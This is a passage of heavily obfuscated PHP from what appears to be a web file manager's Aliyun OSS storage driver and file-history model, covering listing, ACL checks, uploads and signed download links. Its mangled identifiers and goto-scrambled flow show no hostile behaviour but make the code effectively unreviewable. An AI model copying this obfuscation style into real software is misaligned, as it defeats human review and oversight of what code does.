$d¡²Á¹„´Š = $this->objectMeta($bÌÂÇƒÂÁÅ); if (!$d¡²Á¹„´Š) { return $C¤÷º•‘÷±; } $aƒÒÆÆİÑ = array($DšóĞ©™¶[187] => $d¡²Á¹„´Š[$DšóĞ©™¶[1192]][$DšóĞ©™¶[1193]], $DšóĞ©™¶[107] => strtotime($d¡²Á¹„´Š[$DšóĞ©™¶[1190]])); } if (isset($aƒÒÆÆİÑ[$DšóĞ©™¶[107]])) { $C¤÷º•‘÷±[$DšóĞ©™¶[107]] = $aƒÒÆÆİÑ[$DšóĞ©™¶[107]]; } if (isset($aƒÒÆÆİÑ[$DšóĞ©™¶[187]])) { $C¤÷º•‘÷±[$DšóĞ©™¶[187]] = $aƒÒÆÆİÑ[$DšóĞ©™¶[187]]; } return $C¤÷º•‘÷±; } public function listPath($c„¿ä¿ä, $dÓŠÚŞÏ = false) { $D¼‡ °« =& $_SERVER[‚Ğ°–—î]; $eÁ‰¹æê÷È = $this->fileList($c„¿ä¿ä, $D¼‡ °«[8], !0); foreach ($eÁ‰¹æê÷È[$D¼‡ °«[74]] as $E‹•ÓŠÉÄ => $e‚²ØÀ†©‘) { $eÁ‰¹æê÷È[$D¼‡ °«[74]][$E‹•ÓŠÉÄ] = $this->folderInfo($e‚²ØÀ†©‘, $e‚²ØÀ†©‘); } foreach ($eÁ‰¹æê÷È[$D¼‡ °«[73]] as $E‹•ÓŠÉÄ => $e‚²ØÀ†©‘) { $eÁ‰¹æê÷È[$D¼‡ °«[73]][$E‹•ÓŠÉÄ] = $this->fileInfo($e‚²ØÀ†©‘[$D¼‡ °«[28]], $e‚²ØÀ†©‘); } return $eÁ‰¹æê÷È; } public function has($F—„‰Ô…, $d‰Ê‹Ôõˆå = false, $a¬‚Õ×ğÄæ = true) { goto eè¥¿œ¹Ò²; DÂàÀéÛáÙ: $f‘õ„¶¦ = $F”–˜ğöˆ©[33]; $c®ÎÃ’ŠÕÇ = 500; $då‡ÏÀÑÁ‡ = 0; goto Eİ·¤­¶Æ; Eİ·¤­¶Æ: $D„ß¯Ü”‘ = 0; while (!0) { $C×éï«‚Ø = array($F”–˜ğöˆ©[1181] => $F”–˜ğöˆ©[8], $F”–˜ğöˆ©[186] => $F¹¢”É¼Ï, $F”–˜ğöˆ©[1182] => $c®ÎÃ’ŠÕÇ, $F”–˜ğöˆ©[1183] => $f‘õ„¶¦); try { $B·¼°Ûùğ° = $this->client->listObjects($this->bucket, $C×éï«‚Ø); } catch (OSS\Core\OssException $fª–ªÂŒŒ•) { break; } $f‘õ„¶¦ = $B·¼°Ûùğ°->getNextMarker(); $B¦“Ë¤­¯ = $B·¼°Ûùğ°->getObjectList(); $D‡í¦¾ğËù = $B·¼°Ûùğ°->getPrefixList(); if ($d‰Ê‹Ôõˆå) { if (count($B¦“Ë¤­¯) > 1 || count($B¦“Ë¤­¯) == 1 && $B¦“Ë¤­¯[0]->getKey() != $F¹¢”É¼Ï) { $då‡ÏÀÑÁ‡ += count($B¦“Ë¤­¯) - 1; } if (!empty($D‡í¦¾ğËù)) { $D„ß¯Ü”‘ += count($D‡í¦¾ğËù); } if ($f‘õ„¶¦ === $F”–˜ğöˆ©[33]) { break; } continue; } if ($a¬‚Õ×ğÄæ) { if (!empty($B¦“Ë¤­¯)) { if (count($B¦“Ë¤­¯) > 1 || $B¦“Ë¤­¯[0]->getKey() != $F¹¢”É¼Ï) { return !0; } } } else { if (!empty($D‡í¦¾ğËù)) { return !0; } } if ($f‘õ„¶¦ === $F”–˜ğöˆ©[33]) { break; } } if ($d‰Ê‹Ôõˆå) { return array($F”–˜ğöˆ©[191] => $då‡ÏÀÑÁ‡, $F”–˜ğöˆ©[192] => $D„ß¯Ü”‘); } goto e§ìˆ° ˆã; e§ìˆ° ˆã: return !1; goto BÅíƒïÄµÒ; eè¥¿œ¹Ò²: $F”–˜ğöˆ© =& $_SERVER[‚Ğ°–—î]; $F—„‰Ô… = trim($F—„‰Ô…, $F”–˜ğöˆ©[8]); $F¹¢”É¼Ï = empty($F—„‰Ô…) ? $F”–˜ğöˆ©[33] : $F—„‰Ô… . $F”–˜ğöˆ©[8]; goto DÂàÀéÛáÙ; BÅíƒïÄµÒ: } public function listAll($cïáœŒÕ£‚) { $fø¯ÕĞÏ”œ =& $_SERVER[‚Ğ°–—î]; $A´ÑšÁ½´ = $this->fileList($cïáœŒÕ£‚, $fø¯ÕĞÏ”œ[33], !0); $CÌ‰áç”†¿ = array(); foreach ($A´ÑšÁ½´[$fø¯ÕĞÏ”œ[73]] as $B Èâµ˜Ó) { $CÌ‰áç”†¿[$B Èâµ˜Ó[$fø¯ÕĞÏ”œ[28]]] = $B Èâµ˜Ó[$fø¯ÕĞÏ”œ[77]]; } return $this->listAllFiles($cïáœŒÕ£‚, array_keys($CÌ‰áç”†¿), $CÌ‰áç”†¿); } public function canRead($B¨šÕÈ¶Òå) { $aÅÜïßªÚô =& $_SERVER[‚Ğ°–—î]; $fßÂŠÒ¨êí = $this->pathAcl($B¨šÕÈ¶Òå); return $fßÂŠÒ¨êí == $aÅÜïßªÚô[1194] || $fßÂŠÒ¨êí == $aÅÜïßªÚô[491] ? !0 : !1; } public function canWrite($F¹âŠƒ¸) { $cˆœæ¯Ôçå = $this->pathAcl($F¹âŠƒ¸); return $cˆœæ¯Ôçå == $_SERVER[‚Ğ°–—î][491] ? !0 : !1; } public function pathAcl($B¦…ğƒ†ğ) { goto F•ä¨á‹Ã´; AÏŞÙÚ‹š·: $f¨ì«»©ä‹ = $D°©Ç§çö == $AÎÈĞÙÛ·“[34] ? $this->bucketAcl : $D°©Ç§çö; if ($f¨ì«»©ä‹ == $AÎÈĞÙÛ·“[1195]) { return $AÎÈĞÙÛ·“[1194]; } if ($f¨ì«»©ä‹ == $AÎÈĞÙÛ·“[1196]) { return $AÎÈĞÙÛ·“[491]; } goto Dî×ÜîÌÇ; Dî×ÜîÌÇ: return $f¨ì«»©ä‹; goto c×¦¦Ì”»ù; F•ä¨á‹Ã´: $AÎÈĞÙÛ·“ =& $_SERVER[‚Ğ°–—î]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $D°©Ç§çö = $this->client->getObjectAcl($this->bucket, $this->pathEncode($B¦…ğƒ†ğ)); } catch (OSS\Core\OssException $aá…†Ú‘ö‰) { return !1; } goto AÏŞÙÚ‹š·; c×¦¦Ì”»ù: } private function chmodPath($Dâ…™šÜ¡, $B†‰ààêˆ† = '') { $CËÏÈ•âÒ‚ =& $_SERVER[‚Ğ°–—î]; $cêÇö† = empty($B†‰ààêˆ†) ? $CËÏÈ•âÒ‚[1196] : $B†‰ààêˆ†; $f–èæÌçœÆ = array($CËÏÈ•âÒ‚[34], $CËÏÈ•âÒ‚[185], $CËÏÈ•âÒ‚[1195], $CËÏÈ•âÒ‚[1196]); if (!in_array($cêÇö†, $f–èæÌçœÆ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Dâ…™šÜ¡), $cêÇö†); } catch (OSS\Core\OssException $e…šÄÁ¼Ã) { return !1; } return !0; } public function getContent($EñŒé˜Ô„ˆ) { return $this->fileSubstr($EñŒé˜Ô„ˆ, -1); } public function setContent($d’õ†¿¨, $Fš–±èğÏÎ = '') { $eª¾Û¼°«õ =& $_SERVER[‚Ğ°–—î]; try { $CÎÇ“´¯ = $this->trafficLimit($eª¾Û¼°«õ[1197]); $eªâá Â»‡ = $this->client->putObject($this->bucket, $this->pathEncode($d’õ†¿¨), $Fš–±èğÏÎ, $CÎÇ“´¯); } catch (OSS\Core\OssException $e‡Û„¨Ü´¤) { return !1; } $F‹Õ•…ñÄ‰ = array($eª¾Û¼°«õ[1184] => trim($eªâá Â»‡[$eª¾Û¼°«õ[1198]], $eª¾Û¼°«õ[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d’õ†¿¨))); $this->updateObjMeta($d’õ†¿¨, $F‹Õ•…ñÄ‰); return isset($eªâá Â»‡[$eª¾Û¼°«õ[1199]][$eª¾Û¼°«õ[1146]]) ? (int) $eªâá Â»‡[$eª¾Û¼°«õ[1199]][$eª¾Û¼°«õ[1146]] : strlen($eªâá Â»‡); } private function updateObjMeta($dìé¨¹Œñí, $eÌ˜÷ÓÄÈ ) { $dìé¨¹Œñí = $this->pathEncode($dìé¨¹Œñí); try { $D­öàëâŠƒ = array(OSS\OssClient::OSS_HEADERS => $eÌ˜÷ÓÄÈ ); $this->client->copyObject($this->bucket, $dìé¨¹Œñí, $this->bucket, $dìé¨¹Œñí, $D­öàëâŠƒ); } catch (OSS\Core\OssException $DÄ¦¶›˜Ş) { return !1; } return !0; } public function upload($a«ÇÒğäŒ³, $CñÒ‘ãŠ—ä, $Aø¥éë¨¿ë = false, $dÛÅÑÄ›İŒ = REPEAT_REPLACE) { $aÚ“ÃˆäŞô =& $_SERVER[‚Ğ°–—î]; $eàô‡’íÄ = trim($a«ÇÒğäŒ³, $aÚ“ÃˆäŞô[8]); $aõáãÔ¦ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($aÚ“ÃˆäŞô[1184] => @md5_file($CñÒ‘ãŠ—ä)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a«ÇÒğäŒ³))); $aõáãÔ¦ = $this->trafficLimit($aÚ“ÃˆäŞô[1197], $aõáãÔ¦); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eàô‡’íÄ), $CñÒ‘ãŠ—ä, $aõáãÔ¦); } catch (OSS\Core\OssException $B†Œ»Ç¼ì†) { return !1; } return $this->getPathOuter($a«ÇÒğäŒ³); } public function getHost() { $E¸‚³÷½”Ù =& $_SERVER[‚Ğ°–—î]; $B±á‘–²Óˆ = explode($E¸‚³÷½”Ù[171], parent::getHost()); return $B±á‘–²Óˆ[0] . $E¸‚³÷½”Ù[171] . $this->bucket . $E¸‚³÷½”Ù[91] . $B±á‘–²Óˆ[1]; } public function uploadFormData($AÏíè¡ôí, $fïÛÔ²œ² = 3600) { goto BŒõ‡ˆ«±ê; bèİ°¡“Ş: $E ù—áÓõÍ = date($FÜğÒåÅ˜[1200], time() + $E¦Îß¦†Ğª); $aàìÆİ·¦ò = new DateTime($E ù—áÓõÍ); $c¶¾¯ÄæÉã = $aàìÆİ·¦ò->format(DateTime::ISO8601); goto aêç¾…é×É; BŒõ‡ˆ«±ê: $FÜğÒåÅ˜ =& $_SERVER[‚Ğ°–—î]; if (!($Aœğß¶…¥£ = $this->getHost())) { return !1; } $E¦Îß¦†Ğª = $fïÛÔ²œ²; goto bèİ°¡“Ş; aêç¾…é×É: $c¬”²ĞŞ—é = strpos($c¶¾¯ÄæÉã, $FÜğÒåÅ˜[284]); $c¶¾¯ÄæÉã = substr($c¶¾¯ÄæÉã, 0, $c¬”²ĞŞ—é) . $FÜğÒåÅ˜[1201]; $EšùÖŠ°Ä¨ = 1048576000 * 5; goto E–ˆ¬•¸¹; E–ˆ¬•¸¹: $F¤‹§î––› = $this->pathFather($AÏíè¡ôí); $Dİé‡Œ = array($FÜğÒåÅ˜[1103] => $c¶¾¯ÄæÉã, $FÜğÒåÅ˜[1104] => array(array($FÜğÒåÅ˜[1202], 0, $EšùÖŠ°Ä¨), array($FÜğÒåÅ˜[1107], $FÜğÒåÅ˜[1108], $F¤‹§î––›))); $F¯•Œ¶Ò = base64_encode(json_encode($Dİé‡Œ)); goto FÃ‡´ÎµÖÑ; F®Ğ†ŠÙ‚¦: return $fñ÷ª‹œ¹; goto A¢Ç½Â­œ; FÃ‡´ÎµÖÑ: $fµ‡í³¦ ¡ = base64_encode(hash_hmac($FÜğÒåÅ˜[218], $F¯•Œ¶Ò, $this->secret, !0)); $fñ÷ª‹œ¹ = array($FÜğÒåÅ˜[1113] => $F¯•Œ¶Ò, $FÜğÒåÅ˜[1203] => $this->accessKey, $FÜğÒåÅ˜[1109] => $FÜğÒåÅ˜[1101], $FÜğÒåÅ˜[1204] => $fµ‡í³¦ ¡, $FÜğÒåÅ˜[169] => $Aœğß¶…¥£); $fñ÷ª‹œ¹ = $this->trafficLimit($FÜğÒåÅ˜[1197], $fñ÷ª‹œ¹); goto F®Ğ†ŠÙ‚¦; A¢Ç½Â­œ: } public function multiUploadFormData($aÕÒïÏš˜, $b¹ƒ¾‘¡òÀ = 3600) { $F°»ºÊõ÷’ =& $_SERVER[‚Ğ°–—î]; if (!($Dì´µ´è¬¶ = $this->getHost())) { return !1; } $cø·–ëÀ”Ğ = $this->trafficLimit($F°»ºÊõ÷’[1197]); $BÈ‘³•âïµ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aÕÒïÏš˜), $cø·–ëÀ”Ğ); return array($F°»ºÊõ÷’[209] => $BÈ‘³•âïµ, $F°»ºÊõ÷’[169] => $Dì´µ´è¬¶ . $F°»ºÊõ÷’[8] . $this->pathEncode($aÕÒïÏš˜), $F°»ºÊõ÷’[210] => gmdate($F°»ºÊõ÷’[1205]), $F°»ºÊõ÷’[89] => $aÕÒïÏš˜); } public function multiUploadAuthData($EõØÂïÕÂÃ, $fÌ £’Ü”“ = array()) { goto CÙğ‚²×‰…; B±ÕÂµÈìğ: $BªãÉ»¦  = $B“ØøÔ÷©[1208] . $this->accessKey . $B“ØøÔ÷©[4] . $aÜ½ˆªğ¾¿; if (strpos($bÌÌÒ©À„, $B“ØøÔ÷©[213]) === 0) { $BªãÉ»¦  = array($B“ØøÔ÷©[220] => $BªãÉ»¦ , $B“ØøÔ÷©[210] => $BÃŠ•ô¤Ó§); if ($B›©‘¸—›©) { $BªãÉ»¦  = array_merge($BªãÉ»¦ , $B›©‘¸—›©); } } return $BªãÉ»¦ ; goto f‘‚ÛÓØœé; D¨âÍë¼ã²: $F¾Š§Ò¿„ì = array($B“ØøÔ÷©[212], $B“ØøÔ÷©[33], $B“ØøÔ÷©[116], $BÃŠ•ô¤Ó§, "\x78\x2d\x6f\163\x73\55\144\141\164\145\72{$BÃŠ•ô¤Ó§}", $B“ØøÔ÷©[8] . $this->bucket . $B“ØøÔ÷©[8] . $BÄã»ÈÛÇĞ . $bÌÌÒ©À„); if (strpos($bÌÌÒ©À„, $B“ØøÔ÷©[213]) === 0) { $F¾Š§Ò¿„ì[0] = $B“ØøÔ÷©[214]; if ($B›©‘¸—›© = $this->trafficLimit($B“ØøÔ÷©[1197])) { $BÄã»ÈÛÇĞ = $B“ØøÔ÷©[1206]; array_splice($F¾Š§Ò¿„ì, 5, 0, $BÄã»ÈÛÇĞ . $B“ØøÔ÷©[4] . $B›©‘¸—›©[$BÄã»ÈÛÇĞ]); } } if (isset($fÌ £’Ü”“[$B“ØøÔ÷©[215]]) && $fÌ £’Ü”“[$B“ØøÔ÷©[215]] == $B“ØøÔ÷©[216]) { $F¾Š§Ò¿„ì[0] = $B“ØøÔ÷©[216]; } goto aÉÆ›£; CÙğ‚²×‰…: $B“ØøÔ÷© =& $_SERVER[‚Ğ°–—î]; $BÃŠ•ô¤Ó§ = isset($fÌ £’Ü”“[$B“ØøÔ÷©[210]]) ? $fÌ £’Ü”“[$B“ØøÔ÷©[210]] : gmdate($B“ØøÔ÷©[1205]); $bÌÌÒ©À„ = isset($fÌ £’Ü”“[$B“ØøÔ÷©[160]]) ? $fÌ £’Ü”“[$B“ØøÔ÷©[160]] : $B“ØøÔ÷©[33]; goto BÄ‡ïÉ‹Û’; BÄ‡ïÉ‹Û’: $BÄã»ÈÛÇĞ = $EõØÂïÕÂÃ; if (isset($fÌ £’Ü”“[$B“ØøÔ÷©[89]])) { $BÄã»ÈÛÇĞ = $fÌ £’Ü”“[$B“ØøÔ÷©[89]]; unset($fÌ £’Ü”“[$B“ØøÔ÷©[89]]); } if (isset($fÌ £’Ü”“[$B“ØøÔ÷©[211]])) { $fÌ £’Ü”“[$B“ØøÔ÷©[210]] = $BÃŠ•ô¤Ó§; return $this->listUploadParts($BÄã»ÈÛÇĞ, $fÌ £’Ü”“); } goto D¨âÍë¼ã²; aÉÆ›£: if (!empty($fÌ £’Ü”“[$B“ØøÔ÷©[1207]])) { $DÛ®™àùŠâ = array_merge(array($F¾Š§Ò¿„ì[4]), $fÌ £’Ü”“[$B“ØøÔ÷©[1207]]); sort($DÛ®™àùŠâ); $F¾Š§Ò¿„ì[4] = implode($B“ØøÔ÷©[217], $DÛ®™àùŠâ); } $a÷Ú©®´Ñõ = implode($B“ØøÔ÷©[217], $F¾Š§Ò¿„ì); $aÜ½ˆªğ¾¿ = base64_encode(hash_hmac($B“ØøÔ÷©[218], $a÷Ú©®´Ñõ, $this->secret, !0)); goto B±ÕÂµÈìğ; f‘‚ÛÓØœé: } public function listUploadParts($f¸î‰‹ªŠ‰, $d•ô¸˜ï½–) { goto d†È…‰³ªÄ; d†È…‰³ªÄ: $b±ÍÅóØóŸ =& $_SERVER[‚Ğ°–—î]; $b©°¡ƒİ¨† = parse_url_query($d•ô¸˜ï½–[$b±ÍÅóØóŸ[160]]); $DêÏÖì¡¤ = $this->client->listParts($this->bucket, $this->pathEncode($f¸î‰‹ªŠ‰), $b©°¡ƒİ¨†[$b±ÍÅóØóŸ[209]]); goto fŞ‚÷°Ôë; eå¿©¿óù: unset($d•ô¸˜ï½–[$b±ÍÅóØóŸ[211]], $d•ô¸˜ï½–[$b±ÍÅóØóŸ[215]]); $FŸÎåº…È = $this->multiUploadAuthData($f¸î‰‹ªŠ‰, $d•ô¸˜ï½–); if (empty($FŸÎåº…È)) { return !1; } goto eôñÜÕ¦Óİ; fŞ‚÷°Ôë: $EŞº©µÀ¥Ş = $DêÏÖì¡¤->getListPart(); $e›‰ŒàÉùÇ = array(); foreach ($EŞº©µÀ¥Ş as $FÎ¤òèÍ§ñ) { $e›‰ŒàÉùÇ[] = array($b±ÍÅóØóŸ[1188] => $FÎ¤òèÍ§ñ->getPartNumber(), $b±ÍÅóØóŸ[1189] => trim($FÎ¤òèÍ§ñ->getETag(), $b±ÍÅóØóŸ[113])); } goto eå¿©¿óù; eôñÜÕ¦Óİ: return array($b±ÍÅóØóŸ[220] => $FŸÎåº…È, $b±ÍÅóØóŸ[210] => $d•ô¸˜ï½–[$b±ÍÅóØóŸ[210]], $b±ÍÅóØóŸ[222] => $e›‰ŒàÉùÇ); goto DÕ‘§æ•©¼; DÕ‘§æ•©¼: } public function download($eŞãÏßßñ¦, $EùİŞ”°à) { if ($this->isFolder($eŞãÏßßñ¦)) { return !1; } try { $eß¾­¡Ú«à = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $EùİŞ”°à); $eß¾­¡Ú«à = $this->trafficLimit($_SERVER[‚Ğ°–—î][105], $eß¾­¡Ú«à); $this->client->getObject($this->bucket, $this->pathEncode($eŞãÏßßñ¦), $eß¾­¡Ú«à); } catch (OSS\Core\OssException $dÎîš›İ°ª) { return !1; } return $EùİŞ”°à; } public function fileSubstr($bŞµ¿Õ¬Ğ›, $d¦ÌÔ¤£Ë¿ = 0, $b½•™ä´ø“ = false) { if ($d¦ÌÔ¤£Ë¿ === -1) { $a–İäáóò = array(); } else { if ($b½•™ä´ø“ === !1) { $fùŸôÇ«»ñ = $this->size($bŞµ¿Õ¬Ğ›); } else { $fùŸôÇ«»ñ = $d¦ÌÔ¤£Ë¿ + $b½•™ä´ø“ - 1; } $a–İäáóò = array(OSS\OssClient::OSS_RANGE => "{$d¦ÌÔ¤£Ë¿}\55{$fùŸôÇ«»ñ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($bŞµ¿Õ¬Ğ›), $a–İäáóò); } catch (OSS\Core\OssException $eË¹Õ¨Ä²Â) { think_exception($eË¹Õ¨Ä²Â->getMessage()); return !1; } } private function trafficLimit($eßÍƒ¿ª™, $AÃ¶‰§îÔ = array()) { goto F¼àê¥Ô©‚; EŠÈÆ¡ê¸ğ: return $AÃ¶‰§îÔ; goto d‹ƒŠÏ’‹; f˜ºõÔ¿†ˆ: if (!$f¤‡“Ÿµ£Ó) { return $AÃ¶‰§îÔ; } $f¤‡“Ÿµ£Ó = $f¤‡“Ÿµ£Ó < 819200 ? 819200 : ($f¤‡“Ÿµ£Ó > 838860800 ? 838860800 : $f¤‡“Ÿµ£Ó); $AÃ¶‰§îÔ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($f¤‡“Ÿµ£Ó); goto EŠÈÆ¡ê¸ğ; F¼àê¥Ô©‚: $A£¾ì±ÙÄƒ =& $_SERVER[‚Ğ°–—î]; if ($eßÍƒ¿ª™ == $A£¾ì±ÙÄƒ[1197] && $this->isUploadServer() || $eßÍƒ¿ª™ == $A£¾ì±ÙÄƒ[105] && $this->isFileOutServer()) { return $AÃ¶‰§îÔ; } $f¤‡“Ÿµ£Ó = floatval($GLOBALS[$A£¾ì±ÙÄƒ[6]][$A£¾ì±ÙÄƒ[84]][$A£¾ì±ÙÄƒ[103]][$eßÍƒ¿ª™]) * 1024 * 1024 * 8; goto f˜ºõÔ¿†ˆ; d‹ƒŠÏ’‹: } public function link($bé„– ”„ò, $BƒÎÍ±¿æÏ = array()) { $dªß¬¤Õ¿Ü =& $_SERVER[‚Ğ°–—î]; if (!$this->exist($bé„– ”„ò) || $this->isFolder($bé„– ”„ò)) { return !1; } try { $BƒÎÍ±¿æÏ = $this->trafficLimit($dªß¬¤Õ¿Ü[105], $BƒÎÍ±¿æÏ); $cÜ¡›Â¯½« = $this->client->signUrl($this->bucket, $this->pathEncode($bé„– ”„ò), 3600 * 12, $dªß¬¤Õ¿Ü[216], $BƒÎÍ±¿æÏ); return $this->getCdnLink($cÜ¡›Â¯½«); } catch (OSS\Core\OssException $cè“‘‘¾ÌÛ) { return !1; } } public function fileOut($bÎ‰æß‡¨, $aŞ®‚Èù¢ˆ = false, $A©Ãª™©ˆ = false, $b‡­’ù’­² = '') { goto FØÕ§¢ğ‹; D«¯Ü‘Û¢”: $eÃß¹´Ÿ¬Š = array(OSS\OssClient::OSS_SUB_RESOURCE => $E£‹¾ÏÆİ’[1209] . rawurlencode("{$aŞ®‚Èù¢ˆ}\x3b\x66\151\154\x65\156\141\x6d\145\x3d{$A©Ãª™©ˆ}")); $eÃß¹´Ÿ¬Š[OSS\OssClient::OSS_SUB_RESOURCE] .= $E£‹¾ÏÆİ’[1210] . rawurlencode($B„§†…—½¦); $Dæ¤‹¤ì¶¤ = $this->link($bÎ‰æß‡¨, $eÃß¹´Ÿ¬Š); goto c›º›Ù¡“; FØÕ§¢ğ‹: $E£‹¾ÏÆİ’ =& $_SERVER[‚Ğ°–—î]; if (!$A©Ãª™©ˆ) { $A©Ãª™©ˆ = $this->pathThis($bÎ‰æß‡¨); } $A©Ãª™©ˆ = rawurlencode($A©Ãª™©ˆ); goto C‘‘÷·È—; c›º›Ù¡“: $this->fileOutLink($Dæ¤‹¤ì¶¤); goto fôëÚ¯‘§İ; C‘‘÷·È—: $B„§†…—½¦ = get_file_mime(get_path_ext($A©Ãª™©ˆ)); if ($B„§†…—½¦ == $E£‹¾ÏÆİ’[201]) { return parent::fileOut($bÎ‰æß‡¨, $aŞ®‚Èù¢ˆ, $A©Ãª™©ˆ, $b‡­’ù’­²); } $aŞ®‚Èù¢ˆ = $aŞ®‚Èù¢ˆ ? $E£‹¾ÏÆİ’[202] : $E£‹¾ÏÆİ’[203]; goto D«¯Ü‘Û¢”; fôëÚ¯‘§İ: } public function fileOutServer($b±ç™Š©µé, $eŞÜø“Ì² = false, $Bè®é Ôš = false, $c”İÔ‘¥ = '') { parent::fileOut($b±ç™Š©µé, $eŞÜø“Ì², $Bè®é Ôš, $c”İÔ‘¥); } public function fileOutImage($dğöÙš¼¶ô, $D›çùÜË£¬ = 250) { $d†Œ»°©• = array(OSS\OssClient::OSS_PROCESS => $_SERVER[‚Ğ°–—î][1211] . $D›çùÜË£¬); $BÏ¸÷°·ï = $this->link($dğöÙš¼¶ô, $d†Œ»°©•); $this->fileOutLink($BÏ¸÷°·ï); } public function fileOutImageServer($AÒ…Šâ¼Ø‹, $aŒ‘Ÿˆˆ»¶ = 250) { parent::fileOutImage($AÒ…Šâ¼Ø‹, $aŒ‘Ÿˆˆ»¶); } public function fileOutLink($a«áŸË»‘) { $dì‡ëÖ‰•Ä =& $_SERVER[‚Ğ°–—î]; if (!$this->isCdnHost() && substr($a«áŸË»‘, 0, 7) == $dì‡ëÖ‰•Ä[1116]) { $a«áŸË»‘ = $dì‡ëÖ‰•Ä[1117] . substr($a«áŸË»‘, 7); } header($dì‡ëÖ‰•Ä[156] . $a«áŸË»‘); die; } public function hashMd5($açà‡Â¨ò‚, $dÍµŸ¬Ò = '') { $eë‡†Ğ¿ =& $_SERVER[‚Ğ°–—î]; $CƒõšÁèŒ = $this->objectMeta($açà‡Â¨ò‚); if (!$CƒõšÁèŒ) { return $eë‡†Ğ¿[33]; } if (!isset($CƒõšÁèŒ[$eë‡†Ğ¿[1184]]) && !empty($dÍµŸ¬Ò)) { $bêåÅâÜª¤ = $this->updateObjMeta($açà‡Â¨ò‚, array($eë‡†Ğ¿[1184] => $dÍµŸ¬Ò)); $CƒõšÁèŒ[$eë‡†Ğ¿[1184]] = $bêåÅâÜª¤ ? $dÍµŸ¬Ò : $eë‡†Ğ¿[33]; } return isset($CƒõšÁèŒ[$eë‡†Ğ¿[1184]]) ? strtolower($CƒõšÁèŒ[$eë‡†Ğ¿[1184]]) : $eë‡†Ğ¿[33]; } public function size($cšŒ²èèê) { $e¥ã¬ÑÁ…Ñ = $this->objectMeta($cšŒ²èèê); return $e¥ã¬ÑÁ…Ñ ? $e¥ã¬ÑÁ…Ñ[$_SERVER[‚Ğ°–—î][77]] : 0; } public function info($C§±«ïîáƒ) { if ($this->isFolder($C§±«ïîáƒ)) { return $this->folderInfo($C§±«ïîáƒ); } else { if ($this->isFile($C§±«ïîáƒ)) { return $this->fileInfo($C§±«ïîáƒ); } } return !1; } public function exist($Bµ‹ƒ­ÊÎô) { return $this->isFile($Bµ‹ƒ­ÊÎô) || $this->isFolder($Bµ‹ƒ­ÊÎô); } public function isFile($Aòã´¿Ïµß) { return !$this->isFolder($Aòã´¿Ïµß) && $this->objectMeta($Aòã´¿Ïµß); } public function isFolder($cËàùï‰§°) { return $this->cacheMethod($_SERVER[‚Ğ°–—î][223], $cËàùï‰§°); } protected function objectMeta($C²æÎÜë) { return $this->cacheMethod($_SERVER[‚Ğ°–—î][224], $C²æÎÜë); } protected function _objectMeta($c‘¢¦ÛÏ„İ) { $a¹ÒÄèÇ‘ =& $_SERVER[‚Ğ°–—î]; try { $D¤®¢ß†ô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($c‘¢¦ÛÏ„İ)); } catch (OSS\Core\OssException $a‘‚ç¾Øå) { $D¤®¢ß†ô = !1; } if ($D¤®¢ß†ô) { $D¤®¢ß†ô[$a¹ÒÄèÇ‘[77]] = intval($D¤®¢ß†ô[$a¹ÒÄèÇ‘[1191]]); } return $D¤®¢ß†ô; } protected function _isFolder($då‰˜ÛØÀ¶) { $AÓœ‹…ë‚Í =& $_SERVER[‚Ğ°–—î]; if ($då‰˜ÛØÀ¶ == $AÓœ‹…ë‚Í[33] || $då‰˜ÛØÀ¶ == $AÓœ‹…ë‚Í[8]) { return !0; } $féµÄÕØõÔ = array($AÓœ‹…ë‚Í[1181] => $AÓœ‹…ë‚Í[8], $AÓœ‹…ë‚Í[186] => rtrim($då‰˜ÛØÀ¶, $AÓœ‹…ë‚Í[8]) . $AÓœ‹…ë‚Í[8], $AÓœ‹…ë‚Í[1182] => 1, $AÓœ‹…ë‚Í[1183] => $AÓœ‹…ë‚Í[33]); $e…¡»£óŞà = $this->client->listObjects($this->bucket, $féµÄÕØõÔ); if ($e…¡»£óŞà->getObjectList() || $e…¡»£óŞà->getPrefixList()) { return !0; } return !1; } } goto c†Òêôˆ²; a×öœÃ¹âì: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\x63\145\137\x68\x69\x73\164\157\x72\x79"; public function addHistory($E²£¬”®ƒê, $fÎğÊóåÍ = '') { $còáÖÉ‹ =& $_SERVER[‚Ğ°–—î]; $A©‰…†Å¬ = array($còáÖÉ‹[383] => $E²£¬”®ƒê[$còáÖÉ‹[369]], $còáÖÉ‹[1429] => isset($E²£¬”®ƒê[$còáÖÉ‹[379]]) ? $E²£¬”®ƒê[$còáÖÉ‹[379]] : $E²£¬”®ƒê[$còáÖÉ‹[378]], $còáÖÉ‹[420] => $E²£¬”®ƒê[$còáÖÉ‹[419]], $còáÖÉ‹[520] => $E²£¬”®ƒê[$còáÖÉ‹[77]], $còáÖÉ‹[2302] => $fÎğÊóåÍ); $FÈäá…íÁÒ = $GLOBALS[$còáÖÉ‹[6]][$còáÖÉ‹[84]][$còáÖÉ‹[2303]]; if ($FÈäá…íÁÒ > 1) { $this->historyAutoClear($A©‰…†Å¬[$còáÖÉ‹[369]]); $this->add($A©‰…†Å¬); } Model($còáÖÉ‹[2304])->eventFileEdit($E²£¬”®ƒê[$còáÖÉ‹[369]]); } private function historyAutoClear($EÖÍ“¶İï¢) { goto AÒ‚‘§‘; d·ß¶ªğô°: $F¡’“‹–² = array($FÎí´†ïå©[385] => array($FÎí´†ïå©[7], $a»˜‚¬Æ¥‰)); $this->where($F¡’“‹–²)->delete(); Model($FÎí´†ïå©[422])->remove($aä£Ÿ‡¤Óà); goto AÂíÏ¸óÒ; BÂ§¢¬ªİŞ: if (!$Eêëø¶’‡“ || $AÕ¯Œ‡ã¨” >= count($Eêëø¶’‡“)) { return; } $a»˜‚¬Æ¥‰ = array_to_keyvalue($Eêëø¶’‡“, $FÎí´†ïå©[33], $FÎí´†ïå©[367]); 